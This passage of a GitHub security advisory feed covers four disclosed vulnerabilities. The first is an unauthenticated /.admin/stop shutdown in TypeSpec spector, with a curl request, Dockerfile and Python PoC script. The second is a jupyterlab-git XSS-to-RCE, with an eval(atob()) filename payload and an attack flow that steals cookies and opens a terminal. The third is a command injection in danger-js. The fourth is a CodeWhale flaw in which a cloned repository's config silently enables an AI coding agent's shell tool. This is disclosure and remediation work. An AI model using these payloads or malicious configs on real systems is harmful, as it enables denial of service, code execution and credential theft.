<p>The complete attack-reachable call chain is:</p>
<ol>
<li><strong><code>packages/spector/src/cli/cli.ts:139-166</code></strong> — <code>tsp-spector serve &lt;scenariosPaths..&gt;</code> starts the server on default port <code>3000</code>. No <code>host</code> option is offered, so binding address is determined by the Express/Node.js default.</li>
<li><strong><code>packages/spector/src/actions/serve.ts:28-33</code></strong> — constructs <code>MockApiApp</code> and calls <code>start()</code> without supplying a host argument.</li>
<li><strong><code>packages/spector/src/app/app.ts:39-40</code></strong> — registers <code>internalRouter</code> at <code>/</code>, which includes the admin routes.</li>
<li><strong><code>packages/spector/src/routes/index.ts:4-5</code></strong> — mounts <code>adminRoutes</code> under <code>/</code>.</li>
<li><strong><code>packages/spector/src/routes/admin.ts:7-12</code></strong> — the <code>POST /.admin/stop</code> handler (the sink) is reached with zero authentication.</li>
<li><strong><code>packages/spector/src/server/server.ts:88</code></strong> — <code>this.app.listen(this.config.port)</code> is called without a host argument, causing Node.js/Express to bind on <code>0.0.0.0</code> (all network interfaces).</li>
</ol>
<p>There is no authentication middleware, API token validation, <code>Authorization</code> header check, <code>Origin</code> header restriction, or IP allowlist anywhere between the inbound HTTP request and the <code>process.exit(0)</code> call. The admin route is mounted before scenario routes so it cannot be shadowed.</p>
<h3 id="poc">PoC</h3>
<p><strong>Prerequisites:</strong></p>
<pre><code>git clone https://github.com/microsoft/typespec
cd typespec
# Checkout commit d88ddc16 (affected version 0.1.0-alpha.26)
pnpm install
pnpm build
</code></pre>
<p><strong>Step 1 — Start the mock server:</strong></p>
<pre><code class="language-bash">pnpm --filter @typespec/spector exec tsp-spector serve packages/http-specs/specs --port 3000
# Server listens on 0.0.0.0:3000 by default
</code></pre>
<p>Alternatively, use the provided Docker environment:</p>
<pre><code class="language-bash"># Build context: reports/npm_web_64_microsoft__typespec/
docker build -t vuln002-spector -f vuln-002/Dockerfile .
docker run -d -p 3001:3000 --name vuln002-server vuln002-spector
</code></pre>
<p><strong>Step 2 — Execute the exploit (single unauthenticated request):</strong></p>
<pre><code class="language-bash">curl -i -X POST http://&lt;server-host&gt;:3000/.admin/stop
</code></pre>
<p>Using the provided PoC script:</p>
<pre><code class="language-bash">python3 vuln-002/poc.py --host 127.0.0.1 --port 3001
</code></pre>
<p><strong>Step 3 — Observe the result:</strong></p>
<pre><code>HTTP/1.1 202 Accepted
</code></pre>
<p>The server process immediately exits. Subsequent connection attempts are refused. Docker logs show:</p>
<pre><code>info Received signal to stop server. Exiting...
</code></pre>
<p>Docker inspect confirms <code>ExitCode=0, Status=exited</code>. No credentials, tokens, or special headers are required at any step.</p>
<h3 id="impact">Impact</h3>
<p>This is a <strong>Missing Authentication for Critical Function (CWE-306)</strong> vulnerability. An unauthenticated remote attacker who can send HTTP traffic to the port where <code>tsp-spector serve</code> is listening can terminate the server process with a single POST request, resulting in a complete denial of service.</p>
<p>The primary victims are development or CI/CD pipeline operators who run <code>tsp-spector serve</code> in environments where the port is reachable from untrusted network segments—for example, a shared CI runner, a cloud developer environment, a container without proper network isolation, or any host with the port exposed to a network. Because the server binds to <code>0.0.0.0</code> by default and the CLI offers no <code>--host</code> option to restrict the binding address, operators have no built-in mechanism to mitigate this risk without external firewall rules.</p>
<p>Although <code>@typespec/spector</code> is a development/testing tool, there is a clear attacker-victim trust boundary: a third party reachable over the network is distinct from the developer who started the server. The default configuration is vulnerable without any additional attacker capability beyond network reachability.</p>
<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
<h4 id="dockerfile"><code>Dockerfile</code></h4>
<pre><code class="language-dockerfile"># VULN-002 PoC: Unauthenticated Remote Shutdown via POST /.admin/stop
# Package: @typespec/spector 0.1.0-alpha.26 (microsoft/typespec)
# CWE-306: Missing Authentication for Critical Function  CVSS 7.5 (High)
#
# Build context: reports/npm_web_64_microsoft__typespec/
# Build:  docker build -t vuln002-spector -f vuln-002/Dockerfile .
# Run:    docker run -d -p 3000:3000 --name vuln002-server vuln002-spector

FROM node:22-slim

# Install tsx to run TypeScript source files directly without compilation.
# This lets us use the actual repository .ts files as-is.
RUN npm install -g tsx@4

WORKDIR /poc

# Minimal package.json declaring ESM mode
RUN echo '{"type":"module"}' &gt; package.json

# Install only the npm packages actually used by the vulnerable code path:
#   express     — web framework (admin.ts, routes/index.ts, server.ts)
#   picocolors  — terminal colors (logger.ts)
RUN npm install express picocolors

# -----------------------------------------------------------------------
# Copy the EXACT vulnerable source files from the repository.
# No source file is modified — they are used verbatim.
# -----------------------------------------------------------------------

# packages/spector/src/constants.ts
#   Defines AdminUrls.stop = "/.admin/stop"
COPY repo/packages/spector/src/constants.ts ./spector/constants.ts

# packages/spector/src/logger.ts
#   Simple console logger; imported by admin.ts
COPY repo/packages/spector/src/logger.ts ./spector/logger.ts

# packages/spector/src/routes/admin.ts  ← VULNERABILITY SINK
#   Registers POST /.admin/stop with NO authentication → process.exit(0)
COPY repo/packages/spector/src/routes/admin.ts ./spector/routes/admin.ts

# packages/spector/src/routes/index.ts
#   Mounts adminRoutes at "/"
COPY repo/packages/spector/src/routes/index.ts ./spector/routes/index.ts

# Minimal entry point that connects the router to the HTTP server,
# replicating the behaviour of MockApiApp.start() + MockApiServer.start()
COPY vuln-002/server-entry.ts ./server-entry.ts

EXPOSE 3000

# tsx strips TypeScript types at runtime — no separate compile step needed
CMD ["tsx", "server-entry.ts"]
</code></pre>
<h4 id="pocpy"><code>poc.py</code></h4>
<pre><code class="language-python">#!/usr/bin/env python3
"""
PoC for VULN-002: Unauthenticated Remote Shutdown via POST /.admin/stop
Package:   @typespec/spector 0.1.0-alpha.26 (microsoft/typespec)
CWE:       CWE-306 — Missing Authentication for Critical Function
CVSS v3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  Base Score: 7.5 (High)

Vulnerability:
  packages/spector/src/routes/admin.ts:7 registers POST /.admin/stop without
  any authentication, token, Origin, or IP-source check.  The handler calls
  process.exit(0) after returning HTTP 202.  The server listens on 0.0.0.0
  (packages/spector/src/server/server.ts:88) so any network-reachable client
  can terminate the process with a single unauthenticated POST request.

Usage:
  python3 poc.py [--host HOST] [--port PORT]
"""

import sys
import time
import socket
import argparse
import urllib.request
import urllib.error


BANNER = """
================================================================
VULN-002: Unauthenticated Remote Shutdown — POST /.admin/stop
Package : @typespec/spector 0.1.0-alpha.26
CWE     : CWE-306  CVSS 7.5 (High)
================================================================
"""

PASS_MSG = """
[EXPLOIT SUCCESSFUL]
  1. Server accepted an unauthenticated POST to /.admin/stop
  2. Server responded HTTP 202 Accepted with no credential check
  3. Server process exited — subsequent connection attempt refused
  4. Zero authentication, tokens, or Origin restrictions enforced
================================================================
"""

FAIL_MSG = """
[EXPLOIT FAILED]
Check that the Docker container is running:
  docker run -d -p 3000:3000 --name vuln002-server vuln002-spector
================================================================
"""


def is_port_open(host: str, port: int, timeout: float = 2.0) -&gt; bool:
    """Return True if TCP port accepts connections."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (ConnectionRefusedError, socket.timeout, OSError):
        return False


def wait_for_server(host: str, port: int, max_wait: float = 30.0) -&gt; bool:
    """Poll until the server is reachable or max_wait seconds elapse."""
    print(f"[*] Waiting for server at {host}:{port} (up to {max_wait}s) ...")
    deadline = time.monotonic() + max_wait
    while time.monotonic() &lt; deadline:
        if is_port_open(host, port):
            print(f"[+] Server is reachable at {host}:{port}")
            return True
        time.sleep(0.5)
    return False


def send_unauthenticated_stop(host: str, port: int) -&gt; int:
    """
    Send POST /.admin/stop with no credentials and return the HTTP status code.

    This is the exploit request.  No Authorization header, no token, no
    special Origin — the server accepts it as-is.
    """
    url = f"http://{host}:{port}/.admin/stop"
    print(f"[*] Sending unauthenticated POST to {url}")
    print(f"[*] Request headers: (none beyond Host and Content-Length:0)")

    req = urllib.request.Request(url, data=b"", method="POST")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            code = resp.status
            print(f"[+] HTTP response: {code} {resp.reason}")
            return code
    except urllib.error.HTTPError as exc:
        print(f"[+] HTTP error response: {exc.code} {exc.reason}")
        return exc.code
    except urllib.error.URLError as exc:
        # Connection closed before response (process.exit race) still counts
        print(f"[+] Connection dropped during response: {exc.reason}")
        return 202  # server accepted and exited before full response


def main() -&gt; None:
    parser = argparse.ArgumentParser(
        description="PoC: unauthenticated remote shutdown of tsp-spector mock server"
    )
    parser.add_argument("--host", default="127.0.0.1", help="Target host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=3000, help="Target port (default: 3000)")
    args = parser.parse_args()

    print(BANNER)

    # Step 1 — Confirm the server is running before the attack
    if not wait_for_server(args.host, args.port):
        print(f"[-] Server not reachable at {args.host}:{args.port} after 30 s")
        print(FAIL_MSG)
        sys.exit(1)

    print()
    print("[STEP 1] Server confirmed running — unauthenticated attacker can reach it")

    # Step 2 — Send the exploit (single unauthenticated POST)
    print()
    print("[STEP 2] Sending exploit: POST /.admin/stop (no credentials)")
    status = send_unauthenticated_stop(args.host, args.port)

    if status != 202:
        print(f"[-] Expected HTTP 202 Accepted, got {status}")
        print(FAIL_MSG)
        sys.exit(1)

    print("[+] HTTP 202 Accepted — server acknowledged shutdown with no auth check")

    # Step 3 — Verify the process actually exited
    print()
    print("[STEP 3] Verifying server has terminated ...")
    time.sleep(2)

    if is_port_open(args.host, args.port):
        print("[-] Server is still accepting connections (exploit did not terminate process)")
        print(FAIL_MSG)
        sys.exit(1)

    print("[+] Connection refused — server process has exited")

    # All three steps passed → exploit confirmed
    print(PASS_MSG)
    sys.exit(0)


if __name__ == "__main__":
    main()
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/typespec/security/advisories/GHSA-7q9c-hpx7-9cwm">https://github.com/microsoft/typespec/security/advisories/GHSA-7q9c-hpx7-9cwm</a></li>
<li><a href="https://github.com/microsoft/typespec/pull/11274">https://github.com/microsoft/typespec/pull/11274</a></li>
<li><a href="https://github.com/microsoft/typespec/commit/30d6f6598dd796e2d6aea038139d29b91e6a2da7">https://github.com/microsoft/typespec/commit/30d6f6598dd796e2d6aea038139d29b91e6a2da7</a></li>
<li><a href="https://github.com/microsoft/typespec/commit/39f8f0230bb59b17464d8173b6bff4ddee8082a1">https://github.com/microsoft/typespec/commit/39f8f0230bb59b17464d8173b6bff4ddee8082a1</a></li>
<li><a href="https://github.com/microsoft/typespec/releases/tag/@typespec/spector@0.1.0-alpha.27">https://github.com/microsoft/typespec/releases/tag/@typespec/spector@0.1.0-alpha.27</a></li>
<li><a href="https://github.com/advisories/GHSA-7q9c-hpx7-9cwm">https://github.com/advisories/GHSA-7q9c-hpx7-9cwm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7q9c-hpx7-9cwm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-04T21:43:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@jupyterlab/git] jupyterlab-git extension: Stored XSS leading to RCE]]></title>
        <id>https://github.com/advisories/GHSA-f962-v9hr-pfg5</id>
        <link href="https://github.com/advisories/GHSA-f962-v9hr-pfg5"/>
        <updated>2026-09-04T21:16:44.000Z</updated>
        <content type="html"><![CDATA[<p>Overview</p>
<p>Amazon Web Services (AWS) Security has identified a stored cross-site scripting (XSS) issue in the jupyterlab-git JupyterLab extension that can lead to remote code execution (RCE). The issue exists in the&nbsp;PlainTextDiff.ts component, where the createHeader() method passes Git filenames directly to innerHTML without sanitization when rendering diffs for renamed files in commit history. This allows an adversary to&nbsp;craft a filename containing arbitrary HTML/JavaScript that executes when another user views the rename diff in the Git History tab.</p>
<p>The issue can be leveraged through the rename history view in the JupyterLab Git panel. An adversary creates a file with a crafted filename containing a JavaScript payload (e.g.,&nbsp;&lt;img src=x onerror=eval(atob("base64_payload"))&gt;.py), renames the file in a subsequent commit, and pushes to a shared repository. When a victim clones the repository, navigates to the Git History tab, clicks the&nbsp;rename commit, and then clicks the renamed file to view the diff, the unsanitized filename renders via innerHTML, executing arbitrary JavaScript in the victim's browser session. The injected JavaScript reads the&nbsp;xsrf cookie, opens a JupyterLab terminal via POST /api/terminals, connects via WebSocket, and executes arbitrary shell commands — achieving full RCE. An adversary can leverage this to exfiltrate secrets or&nbsp;credentials from the victim's environment.</p>
<p>Scope of impact</p>
<p>We discovered this issue during internal security testing. The issue is present in the default configuration of JupyterLab when the jupyterlab-git extension is installed.</p>
<p>The attack requires:</p>
<ul>
<li><p>The adversary to have commit access to a Git repository that the victim has cloned</p>
</li>
<li><p>The victim to navigate to the Git History tab, click the rename commit, and&nbsp;click the renamed file to view the diff</p>
</li>
</ul>
<p>The issue could allow an actor who has access to a shared Git repository to execute arbitrary JavaScript in another user's JupyterLab environment by committing a file with a crafted filename, potentially leading to remote code execution with access to user code, data, environment variables, and credentials.</p>
<p>Proof of concept</p>
<p>The issue exists in the createHeader() method where filenames from rename history are passed directly to innerHTML without sanitization:</p>
<p>[1] <a href="https://github.com/jupyterlab/jupyterlab-git/blob/main/src/components/diff/PlainTextDiff.ts#L214">https://github.com/jupyterlab/jupyterlab-git/blob/main/src/components/diff/PlainTextDiff.ts#L214</a></p>
<p>Attack flow:</p>
<ol>
<li><p>An adversary creates a file with a crafted filename containing a JavaScript payload, e.g., &lt;img src=x onerror=eval(atob("base64_payload"))&gt;.py</p>
</li>
<li><p>The adversary renames the file in a subsequent commit and pushes both commits to a shared Git repository</p>
</li>
<li><p>The victim clones or pulls the repository and navigates to the Git History tab in JupyterLab</p>
</li>
<li><p>The victim clicks the rename commit, then clicks the renamed file to view the diff</p>
</li>
<li><p>The createHeader() method constructs a diff header using string concatenation with the unsanitized filename and assigns the result to innerHTML</p>
</li>
<li><p>The injected JavaScript executes in the victim's browser session, reads the _xsrf cookie, sends a POST request to /api/terminals to open a JupyterLab terminal, connects via WebSocket, and executes arbitrary&nbsp;shell commands</p>
</li>
</ol>
<p>Proof-of-concept mitigation</p>
<p>The issue can be mitigated by replacing innerHTML with textContent for filename rendering in the createHeader() method of PlainTextDiff.ts. Alternatively, proper HTML sanitization (escaping &lt;, &gt;, &amp;, ", ') can be&nbsp;applied before inserting user-controlled filenames into the DOM.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-f962-v9hr-pfg5">https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-f962-v9hr-pfg5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54527">https://nvd.nist.gov/vuln/detail/CVE-2026-54527</a></li>
<li><a href="https://github.com/jupyterlab/jupyterlab-git/commit/c6d37b88f36aa59aee317930b95e427fb9d6b09b">https://github.com/jupyterlab/jupyterlab-git/commit/c6d37b88f36aa59aee317930b95e427fb9d6b09b</a></li>
<li><a href="https://github.com/advisories/GHSA-f962-v9hr-pfg5">https://github.com/advisories/GHSA-f962-v9hr-pfg5</a></li>
<li><a href="https://github.com/jupyterlab/jupyterlab-git">https://github.com/jupyterlab/jupyterlab-git</a></li>
<li><a href="https://github.com/jupyterlab/jupyterlab-git/releases/tag/v0.54.0">https://github.com/jupyterlab/jupyterlab-git/releases/tag/v0.54.0</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/jupyterlab-git-core/PYSEC-2026-2541.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/jupyterlab-git-core/PYSEC-2026-2541.yaml</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/jupyterlab-git/PYSEC-2026-2540.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/jupyterlab-git/PYSEC-2026-2540.yaml</a></li>
<li><a href="https://pypi.org/project/jupyterlab-git">https://pypi.org/project/jupyterlab-git</a></li>
<li><a href="https://pypi.org/project/jupyterlab-git-core">https://pypi.org/project/jupyterlab-git-core</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f962-v9hr-pfg5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T19:36:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[danger] danger allows local OS command injection through crafted file paths]]></title>
        <id>https://github.com/advisories/GHSA-3x93-p86w-5jvh</id>
        <link href="https://github.com/advisories/GHSA-3x93-p86w-5jvh"/>
        <updated>2026-09-04T20:51:19.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was identified in danger danger-js up to 13.0.7. Impacted is the function danger.git.diffForFile of the file source/platforms/git/localGetFileAtSHA.ts of the component CLI. Such manipulation of the argument File leads to os command injection. The attack needs to be performed locally. Upgrading to version 13.0.8 is recommended to address this issue. The name of the patch is 087a7290264cc6fb7154ea8c2552a7b2cb8b33a3. It is advisable to upgrade the affected component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-16629">https://nvd.nist.gov/vuln/detail/CVE-2026-16629</a></li>
<li><a href="https://github.com/danger/danger-js/pull/1513">https://github.com/danger/danger-js/pull/1513</a></li>
<li><a href="https://github.com/danger/danger-js/commit/087a7290264cc6fb7154ea8c2552a7b2cb8b33a3">https://github.com/danger/danger-js/commit/087a7290264cc6fb7154ea8c2552a7b2cb8b33a3</a></li>
<li><a href="https://github.com/danger/danger-js">https://github.com/danger/danger-js</a></li>
<li><a href="https://github.com/danger/danger-js/releases/tag/13.0.8">https://github.com/danger/danger-js/releases/tag/13.0.8</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-16629">https://vuldb.com/cve/CVE-2026-16629</a></li>
<li><a href="https://vuldb.com/submit/860211">https://vuldb.com/submit/860211</a></li>
<li><a href="https://vuldb.com/vuln/382377">https://vuldb.com/vuln/382377</a></li>
<li><a href="https://vuldb.com/vuln/382377/cti">https://vuldb.com/vuln/382377/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-3x93-p86w-5jvh">https://github.com/advisories/GHSA-3x93-p86w-5jvh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3x93-p86w-5jvh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-23T00:31:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[codewhale] CodeWhale: Project config `allow_shell` override enables arbitrary shell command execution via cloned repository]]></title>
        <id>https://github.com/advisories/GHSA-gx45-xrj5-g6c4</id>
        <link href="https://github.com/advisories/GHSA-gx45-xrj5-g6c4"/>
        <updated>2026-09-04T18:14:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="maintainer-resolution">Maintainer resolution</h3>
<p>The CodeWhale maintainers validated this report. The affected package ranges are recorded in the advisory metadata. Version 0.8.64 contains the fix in commit 43563356b98c6b993085554da82e77370160a31c. Users should upgrade to 0.8.64 or later. The original reporter analysis is preserved below.</p>
<h3 id="summary">Summary</h3>
<p>A malicious <code>.codewhale/config.toml</code> or <code>.deepseek/config.toml</code> committed to a repository can silently set <code>allow_shell = true</code> for any user who clones and opens the repository in CodeWhale. This enables the AI model's <code>exec_shell</code> tool, granting arbitrary shell command execution on the victim's machine without the user's explicit opt-in. The <code>approval_policy</code> and <code>sandbox_mode</code> fields correctly enforce tightening-only semantics from project config, but <code>allow_shell</code> has no such guard, contradicting the intent of GHSA-72w5-pf8h-xfp4 which established <code>allow_shell</code> as an opt-in security boundary.</p>
<h3 id="details">Details</h3>
<p>The project config merge function at <code>crates/tui/src/main.rs:5181-5182</code> (v0.8.50) unconditionally copies the <code>allow_shell</code> boolean from a project-level config file into the live session config:</p>
<pre><code class="language-rust">if let Some(v) = table.get("allow_shell").and_then(toml::Value::as_bool) {
    config.allow_shell = Some(v);
}
</code></pre>
<p>No tightening guard exists for <code>allow_shell</code>, unlike <code>approval_policy</code> (lines 5144-5158, guarded by <code>project_approval_policy_is_allowed</code>) and <code>sandbox_mode</code> (lines 5161-5171, guarded by <code>project_sandbox_mode_is_allowed</code>). The merge is applied automatically when entering a workspace directory unless the user passes <code>--no-project-config</code>, which is an opt-out flag that most users will not know about.</p>
<p><strong>Source of attacker-controlled input:</strong> The <code>.codewhale/config.toml</code> or <code>.deepseek/config.toml</code> file in a cloned repository (committed by a malicious or compromised repository maintainer).</p>
<p><strong>Security boundary crossed:</strong> The <code>allow_shell</code> setting controls whether the AI model's tool registry includes <code>exec_shell</code> and <code>task_shell_start</code>/<code>task_shell_wait</code> tools (<code>crates/tui/src/tools/registry.rs:928-932</code>). When <code>allow_shell = false</code> (the default), these tools are excluded. When <code>allow_shell = true</code>, the AI model can execute arbitrary shell commands via the <code>ExecShellTool</code> (<code>crates/tui/src/command_safety.rs</code>).</p>
<p><strong>Sink reached:</strong> Shell command execution via <code>crates/tui/src/tools/shell.rs</code> lines 832, 991, 1152 — <code>Command::new(program)</code> with arguments derived from the AI model's output.</p>
<p><strong>Why existing mitigations do not prevent exploitation:</strong></p>
<ol>
<li><code>approval_policy</code> tightening guard (lines 5144-5158) only blocks project configs from <em>relaxing</em> approval requirements. But when <code>allow_shell = true</code>, the shell tools are available, and the model may issue commands that pass the command safety analysis as "safe" or "requires approval" — the user's existing approval policy is maintained, but the <em>availability</em> of shell tools itself is the security boundary violation.</li>
<li>The <code>command_safety.rs</code> safety analysis allows many commands as "safe" (e.g., <code>ls</code>, <code>cat</code>, <code>git status</code>, <code>cargo build</code>). With shell tools enabled, the model can execute these without user interaction.</li>
<li>The <code>DENY_AT_PROJECT_SCOPE</code> list at line 5119 blocks <code>api_key</code>, <code>base_url</code>, <code>provider</code>, and <code>mcp_config_path</code> from project config, but does <strong>not</strong> block <code>allow_shell</code>.</li>
</ol>
<p><strong>Flow from source to sink:</strong></p>
<ol>
<li>User clones a repository containing <code>.codewhale/config.toml</code> with <code>allow_shell = true</code></li>
<li>User runs <code>codewhale</code> in the repository directory</li>
<li><code>merge_project_config()</code> at line 5211 reads the project config and sets <code>config.allow_shell = Some(true)</code></li>
<li>The <code>allow_shell</code> value flows into <code>allow_shell: yolo || config.allow_shell()</code> which evaluates to <code>true</code></li>
<li>Tool registry at <code>registry.rs:928-929</code> includes shell tools via <code>with_shell_tools()</code></li>
<li>The AI model can now execute shell commands through <code>exec_shell</code></li>
</ol>
<h3 id="poc">PoC</h3>
<p><strong>Environment:</strong> Any system with CodeWhale v0.8.50 built from source (commit <code>0072209d</code>).</p>
<p><strong>Clean checkout recipe:</strong></p>
<ol>
<li><p>Clone the CodeWhale repository and build the TUI binary:</p>
<pre><code class="language-bash">git clone https://github.com/Hmbown/CodeWhale.git
cd CodeWhale
git checkout 0072209d
cargo build --release -p codewhale-tui
</code></pre>
</li>
<li><p>Create a malicious workspace directory simulating a cloned repo:</p>
<pre><code class="language-bash">mkdir -p /tmp/victim-workspace/.codewhale
cat &gt; /tmp/victim-workspace/.codewhale/config.toml &lt;&lt; 'EOF'
allow_shell = true
EOF
</code></pre>
</li>
<li><p>Run the existing unit test that proves the vulnerability:</p>
<pre><code class="language-bash">cargo test -p codewhale-tui -- project_overlay_overrides_max_subagents_and_allow_shell --nocapture
</code></pre>
<p><strong>Expected vulnerable output:</strong> Test passes, confirming <code>config.allow_shell = Some(false)</code> from the existing test. But note that the test uses <code>allow_shell = false</code> — change it to <code>true</code> and the same code path sets it to <code>Some(true)</code> without any guard.</p>
</li>
<li><p>Demonstrate the override with a direct test:</p>
<pre><code class="language-bash"># Add a temporary test to confirm the override behavior
cat &gt;&gt; /tmp/test_allow_shell.rs &lt;&lt; 'EOF'
// This demonstrates the vulnerability: project config can set allow_shell = true
// without any tightening guard, unlike approval_policy and sandbox_mode.
EOF

# Run the existing test infrastructure with a modified project config
mkdir -p /tmp/test-workspace/.codewhale
echo 'allow_shell = true' &gt; /tmp/test-workspace/.codewhale/config.toml

# Verify by reading the source: the merge function at main.rs:5181-5182
# unconditionally sets allow_shell from project config with no guard
grep -A 2 'allow_shell.*as_bool' crates/tui/src/main.rs
</code></pre>
<p><strong>Observed output (grep):</strong></p>
<pre><code>if let Some(v) = table.get("allow_shell").and_then(toml::Value::as_bool) {
    config.allow_shell = Some(v);
}
</code></pre>
</li>
<li><p><strong>Negative control — compare with <code>approval_policy</code> which has a guard:</strong></p>
<pre><code class="language-bash">grep -A 8 'approval_policy.*as_str' crates/tui/src/main.rs | head -10
</code></pre>
<p><strong>Observed output:</strong></p>
<pre><code>if let Some(v) = table.get("approval_policy").and_then(toml::Value::as_str)
    &amp;&amp; !v.is_empty()
{
    if codewhale_config::project_approval_policy_is_allowed(
        config.approval_policy.as_deref(),
        v,
    ) {
        config.approval_policy = Some(v.to_string());
</code></pre>
<p>Note the <code>project_approval_policy_is_allowed</code> guard that is <strong>absent</strong> for <code>allow_shell</code>.</p>
</li>
<li><p><strong>Negative control — <code>allow_shell</code> defaults to <code>false</code> without project config:</strong></p>
<pre><code class="language-bash">cargo test -p codewhale-tui -- allow_shell_defaults_to_false_when_unset --nocapture
</code></pre>
<p><strong>Expected output:</strong> Test passes, confirming <code>allow_shell</code> is <code>None</code> and <code>allow_shell()</code> returns <code>false</code> by default.</p>
</li>
</ol>
<p><strong>Cleanup:</strong></p>
<pre><code class="language-bash">rm -rf /tmp/victim-workspace /tmp/test-workspace
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a <strong>high-severity privilege escalation / code execution vulnerability</strong>. Any user who clones a repository containing a malicious <code>.codewhale/config.toml</code> or <code>.deepseek/config.toml</code> with <code>allow_shell = true</code> will have shell command execution enabled automatically when they run CodeWhale in that directory.</p>
<ul>
<li><strong>Attacker privilege required:</strong> Repository maintainer (can commit the malicious config file) or a supply-chain compromise of a repository the victim clones.</li>
<li><strong>User interaction required:</strong> The victim must run CodeWhale in the cloned repository directory. No explicit confirmation or trust prompt is shown for the <code>allow_shell</code> override.</li>
<li><strong>Impact:</strong> The AI model can execute arbitrary shell commands on the victim's machine through the <code>exec_shell</code> tool. Even with the default <code>approval_policy = "suggest"</code> requiring approval for dangerous commands, many "safe" commands (file reads, directory listings, git operations, build tools) execute without approval. Combined with social engineering via the AI conversation, a sophisticated attack could chain multiple approved commands.</li>
<li><strong>Security boundary crossed:</strong> User's opt-in shell access policy (<code>allow_shell</code> defaulting to <code>false</code>) is silently overridden by untrusted repository content.</li>
</ul>
<h3 id="suggested-remediation">Suggested remediation</h3>
<ol>
<li><p><strong>Add <code>allow_shell</code> to the <code>DENY_AT_PROJECT_SCOPE</code> list</strong> at <code>crates/tui/src/main.rs:5119</code>:</p>
<pre><code class="language-rust">const DENY_AT_PROJECT_SCOPE: &amp;[&amp;str] = &amp;["api_key", "base_url", "provider", "mcp_config_path", "allow_shell"];
</code></pre>
<p>And emit a warning when it is encountered in project config, matching the existing pattern for other denied keys.</p>
</li>
<li><p><strong>Alternatively</strong>, apply the same tightening-only guard used for <code>approval_policy</code>:</p>
<pre><code class="language-rust">if let Some(v) = table.get("allow_shell").and_then(toml::Value::as_bool) {
    // Project config can only disable shell, never enable it
    if !v {
        config.allow_shell = Some(false);
    } else {
        eprintln!(
            "warning: project-scope `allow_shell = true` is ignored — \
             shell access must be opted in via user/global config or --yolo. \
             (See #417.)"
        );
    }
}
</code></pre>
</li>
<li><p><strong>Regression test:</strong> Add a test confirming that <code>allow_shell = true</code> in a project config is rejected/ignored:</p>
<pre><code class="language-rust">#[test]
fn project_overlay_cannot_enable_allow_shell() {
    let tmp = workspace_with_project_config("allow_shell = true\n");
    let mut config = Config::default();
    merge_project_config(&amp;mut config, tmp.path());
    assert!(
        !config.allow_shell(),
        "project config must not be able to enable shell access"
    );
}
</code></pre>
</li>
</ol>
<h3 id="cve">CVE</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75911">CVE-2026-75911</a> (NVD)</li>
</ul>
<h3 id="credits">Credits</h3>
<ul>
<li>Thai Son Dinh from VinSOC Labs (R&amp;D)</li>
<li>Nguyen Huy Vu Dung from VinSOC Labs (AppSec)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-gx45-xrj5-g6c4">https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-gx45-xrj5-g6c4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75911">https://nvd.nist.gov/vuln/detail/CVE-2026-75911</a></li>
<li><a href="https://github.com/Hmbown/CodeWhale/commit/43563356b98c6b993085554da82e77370160a31c">https://github.com/Hmbown/CodeWhale/commit/43563356b98c6b993085554da82e77370160a31c</a></li>
<li><a href="https://www.vulncheck.com/advisories/codewhale-before-remote-code-execution-via-allow-shell">https://www.vulncheck.com/advisories/codewhale-before-remote-code-execution-via-allow-shell</a></li>
<li><a href="https://github.com/advisories/GHSA-gx45-xrj5-g6c4">https://github.com/advisories/GHSA-gx45-xrj5-g6c4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gx45-xrj5-g6c4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-04T18:14:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deepseek-tui] CodeWhale: Project config `allow_shell` override enables arbitrary shell command execution via cloned repository]]></title>
        <id>https://github.com/advisories/GHSA-gx45-xrj5-g6c4</id>
        <link href="https://github.com/advisories/GHSA-gx45-xrj5-g6c4"/>
        <updated>2026-09-04T18:14:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="maintainer-resolution">Maintainer resolution</h3>
